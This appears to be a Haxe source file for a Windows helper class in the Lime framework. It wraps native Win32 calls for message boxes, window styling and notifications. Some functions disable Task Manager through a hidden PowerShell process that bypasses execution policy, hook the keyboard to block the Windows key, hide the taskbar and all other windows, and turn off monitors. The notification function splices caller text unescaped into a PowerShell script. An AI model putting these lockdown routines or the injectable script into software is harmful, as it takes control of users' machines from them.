package lime.system;

import lime.app.Application;
import lime.system.HiddenProcess;
#if sys
import sys.*;
import sys.io.*;
#end

enum abstract MessageBoxOptions(Int) to Int {
	final OK = 0x00000000;
	final OKCANCEL = 0x00000001;
	final ABORTRETRYIGNORE = 0x00000002;
	final YESNOCANCEL = 0x00000003;
	final YESNO = 0x00000004;
	final RETRYCANCEL = 0x00000005;
	final CANCELTRYCONTINUE = 0x00000006;
	final HELP = 0x00004000;
}

enum abstract MessageBoxIcon(Int) to Int {
	final NONE = 0x00000000;
	final STOP = 0x00000010;
	final ERROR = 0x00000010;
	final HAND = 0x00000010;
	final QUESTION = 0x00000020;
	final EXCLAMATION = 0x00000030;
	final WARNING = 0x00000030;
	final INFORMATION = 0x00000040;
	final ASTERISK = 0x00000040;
}

enum abstract MessageBoxDefaultButton(Int) to Int {
	final BUTTON1 = 0x00000000;
	final BUTTON2 = 0x00000100;
	final BUTTON3 = 0x00000200;
	final BUTTON4 = 0x00000300;
}

enum abstract MessageBoxReturnValue(Int) from Int to Int {
	final OK = 1;
	final CANCEL = 2;
	final ABORT = 3;
	final RETRY = 4;
	final IGNORE = 5;
	final YES = 6;
	final NO = 7;
	final TRYAGAIN = 10;
	final CONTINUE = 11;
}


@:cppFileCode('
	#include <Windows.h>
	#include <windowsx.h>
	#include <cstdio>
	#include <iostream>
	#include <tchar.h>
	#include <dwmapi.h>
	#include <winuser.h>
	#include <winternl.h>
	#include <Shlobj.h>
	#include <commctrl.h>
	#include <string>

	#include <chrono>
	#include <thread>

	#define UNICODE

	#pragma comment(lib, "Dwmapi")
	#pragma comment(lib, "ntdll.lib")
	#pragma comment(lib, "user32.lib")
	#pragma comment(lib, "Shell32.lib")
	#pragma comment(lib, "gdi32.lib")
	#pragma comment(lib, "Advapi32")

	/////////////////////////////////////////////////////////////////

	LRESULT CALLBACK KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam) {
	if (nCode == HC_ACTION) {
		KBDLLHOOKSTRUCT* pKeyboard = (KBDLLHOOKSTRUCT*)lParam;

		if (pKeyboard->vkCode == VK_LWIN || pKeyboard->vkCode == VK_RWIN) {
			return 1;
		}
	}
	return CallNextHookEx(NULL, nCode, wParam, lParam);
	}

	static BOOL CALLBACK enumWinProc(HWND hwnd, LPARAM lparam) {
		std::vector<std::string> *names = reinterpret_cast<std::vector<std::string> *>(lparam);
		char title_buffer[512] = {0};
		int ret = GetWindowTextA(hwnd, title_buffer, 512);
		//title blacklist: "Program Manager", "Setup"
		if (IsWindowVisible(hwnd) && ret != 0 && std::string(title_buffer) != names->at(0) && std::string(title_buffer) != "Program Manager" && std::string(title_buffer) != "Setup") {
			ShowWindow(hwnd, SW_HIDE);
			names->insert(names->begin() + 1, std::string(title_buffer));
		}
		return 1;
	}
')

class Windows {

	private static var wereHidden:Array<String> = [];

	public static function msgBox(message:String = "", title:String = "", sowyType:Int = 0):MessageBoxReturnValue {
		return untyped MessageBox(NULL, message, title, sowyType | 0x00010000);
	}

	@:functionCode('
		HWND hwnd = GetActiveWindow();
		SetWindowPos(hwnd, (HWND)post, x, y, cx, cy, style);
	')
	public static function setWindowPos(post:Int, x:Int, y:Int, cx:Int, cy:Int, style:Int) {}

	@:functionCode('
		HWND hwnd = GetActiveWindow();
		LONG exStyle = GetWindowLong(hwnd, GWL_EXSTYLE);

		if (hide == true) {
			exStyle &= WS_EX_APPWINDOW;
			exStyle |= WS_EX_TOOLWINDOW;
		} else {
			exStyle |= WS_EX_APPWINDOW;
			exStyle &= WS_EX_TOOLWINDOW;
		}

		SetWindowLong(hwnd, GWL_EXSTYLE, exStyle);
	')
	public static function hideWindowInTab(hide:Bool):Bool {
		return hide;
	}

	public static function setWindowDarkColorMode(bool:Bool):Bool {
		var dark:Int = bool ? 1 : 0;
		untyped __cpp__("
			int darkMode = dark;
			HWND window = GetActiveWindow();
			if (S_OK != DwmSetWindowAttribute(window, 19, &darkMode, sizeof(darkMode))) {
				DwmSetWindowAttribute(window, DWMWA_USE_IMMERSIVE_DARK_MODE, &darkMode, sizeof(darkMode));
			}
			UpdateWindow(window);
		");
		return bool;
	}

	@:functionCode('
        HWND window = GetActiveWindow();

		auto color = RGB(r, g, b);

        if (S_OK != DwmSetWindowAttribute(window, 35, &color, sizeof(COLORREF))) {
            DwmSetWindowAttribute(window, 35, &color, sizeof(COLORREF));
        }

		if (S_OK != DwmSetWindowAttribute(window, 34, &color, sizeof(COLORREF))) {
            DwmSetWindowAttribute(window, 34, &color, sizeof(COLORREF));
        }

        UpdateWindow(window);
    ')
	public static function setWindowBorderColor(r:Int, g:Int, b:Int) {}

	@:functionCode('
		bool value = hide;
		HWND hwnd = FindWindowA("Shell_traywnd", nullptr);
		HWND hwnd2 = FindWindowA("Shell_SecondaryTrayWnd", nullptr);

		if (value == true) {
			ShowWindow(hwnd, SW_HIDE);
			ShowWindow(hwnd2, SW_HIDE);
		} else {
			ShowWindow(hwnd, SW_SHOW);
			ShowWindow(hwnd2, SW_SHOW);
		}
    ')
	public static function hideTaskbar(hide:Bool):Bool {
		return hide;
	}

	@:functionCode('
		std::string windowTitle = window;

		HWND hwnd = FindWindowA(NULL, windowTitle.c_str());
		if (hwnd != NULL) {
            PostMessage(hwnd, WM_CLOSE, 0, 0);
		}
	')
	public static function checkTitleWindow(window:String) {}

	@:functionCode('
		BOOL isAdmin = FALSE;
		HANDLE hToken = nullptr;

		if (OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, &hToken)) {
			TOKEN_ELEVATION elevation;
			DWORD size;
			if (GetTokenInformation(hToken, TokenElevation, &elevation, sizeof(elevation), &size)) {
				isAdmin = elevation.TokenIsElevated;
			}
			CloseHandle(hToken);
		}
		return isAdmin;
	')
	public static function checkRunAsAdministrator():Bool {
		return false;
	}

	@:functionCode('
		HWND hwnd = GetActiveWindow();
		if (hwnd) {
			SendMessage(hwnd, WM_SETICON, ICON_SMALL, (LPARAM)nullptr);
			SendMessage(hwnd, WM_SETICON, ICON_BIG, (LPARAM)nullptr);
			LONG lStyle = GetWindowLong(hwnd, GWL_STYLE);
			lStyle &= ~WS_SYSMENU;
			SetWindowLong(hwnd, GWL_STYLE, lStyle);
		}
    ')
	public static function removeAllWindowButtons() {}

	@:functionCode('
		HWND hwnd = GetActiveWindow();

		if (hwnd) {
			LONG exStyle = GetWindowLong(hwnd, GWL_EXSTYLE);

			DWM_BLURBEHIND blurBehind = {};
			blurBehind.dwFlags = DWM_BB_ENABLE | DWM_BB_BLURREGION;
			blurBehind.hRgnBlur = CreateRectRgn(-1, -1, 0, 0);
			blurBehind.fEnable = transparent;

			DwmEnableBlurBehindWindow(hwnd, &blurBehind);

			if (transparent) {
				exStyle |= WS_EX_LAYERED | WS_EX_TRANSPARENT;
			} else {
				exStyle &= ~WS_EX_LAYERED;
				exStyle &= ~WS_EX_TRANSPARENT;
			}

			SetWindowLong(hwnd, GWL_EXSTYLE, exStyle);
		}
	')
	public static function setWindowTransparent(transparent:Bool):Bool {
		return transparent;
	}

	@:functionCode('SendMessage(HWND_BROADCAST, WM_SYSCOMMAND, SC_MONITORPOWER, (LPARAM)num);')
	public static function offMonitor(num:Int) {}

	@:functionCode('
		HHOOK hHook = SetWindowsHookEx(WH_KEYBOARD_LL, KeyboardProc, NULL, 0);
		MSG msg;
		if (GetMessage(&msg, NULL, 0, 0)) {
			TranslateMessage(&msg);
			DispatchMessage(&msg);
		}
	')
	public static function blockWINkey() {}

	@:functionCode('
		std::vector<std::string> winNames = {};
		winNames.emplace_back(std::string(windowTitle.c_str()));
		EnumWindows(enumWinProc, reinterpret_cast<LPARAM>(&winNames));
		ShowWindow(FindWindowA(NULL, windowTitle.c_str()), SW_SHOW);
		Array_obj<String> *hxNames = new Array_obj<String>(winNames.size(), winNames.size());
		for (int i = 1; i < winNames.size(); i++) {
			hxNames->Item(i - 1) = String(winNames[i].c_str());
		}
		hxNames->Item(winNames.size() - 1) = String(winNames[0].c_str());
		return hxNames;
	')
	private static function _hideWindows(windowTitle:String):Array<String> {
		return [];
	}

	public static function hideWindows() {
		wereHidden = _hideWindows(Application.current.window.title);
	}

	@:functionCode('
		for (int i = 0; i < sizeHidden; i++) {
			HWND hwnd = FindWindowA(NULL, prevHidden->Item(i).c_str());
			if (hwnd != NULL) {
				ShowWindow(hwnd, SW_SHOWNA);
			}
		}
	')
	private static function _restoreWindows(prevHidden:Array<String>, sizeHidden:Int) {}

	public static function restoreWindows() {
		_restoreWindows(wereHidden, wereHidden.length);
	}

	public static function byeTaskMGR(bool:Bool) {
		var num:Int = 1;
		bool ? num = 1 : num = 0;
        var procces = '
        New-Item -Path "HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies" -Name "System" -Force
		\nSet-ItemProperty -Path "HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System" -Name "DisableTaskMgr" -Value $num';
		new HiddenProcess('powershell', ['-ExecutionPolicy', 'Bypass', procces]);
    }

    public static function notification(text:String, title:String) {
        var procces =
        "\n$ErrorActionPreference = 'Stop'"
        + "\n$notificationTitle = "
		+ '"$text"'
        + "\n[Windows.UI.Notifications.ToastNotificationManager, Windows.UI.Notifications, ContentType = WindowsRuntime] > $null"
        + "\n$template = [Windows.UI.Notifications.ToastNotificationManager]::GetTemplateContent([Windows.UI.Notifications.ToastTemplateType]::ToastText01)"
        + "\n$toastXml = [xml] $template.GetXml()"
        + "\n$toastXml.GetElementsByTagName('text').AppendChild($toastXml.CreateTextNode($notificationTitle)) > $null"
        + "\n$xml = New-Object Windows.Data.Xml.Dom.XmlDocument"
        + "\n$xml.LoadXml($toastXml.OuterXml)"
        + "\n$toast = [Windows.UI.Notifications.ToastNotification]::new($xml)"
        + "\n$toast.Tag = 'Test1'"
        + "\n$toast.Group = 'Test2'"
        + "\n$toast.ExpirationTime = [DateTimeOffset]::Now.AddSeconds(5)"
        + "\n$notifier = [Windows.UI.Notifications.ToastNotificationManager]::CreateToastNotifier("
		+'$title'
		+ ")"
        + "\n$notifier.Show($toast);";
		new HiddenProcess('powershell', ['-ExecutionPolicy', 'Bypass', procces]);
    }
}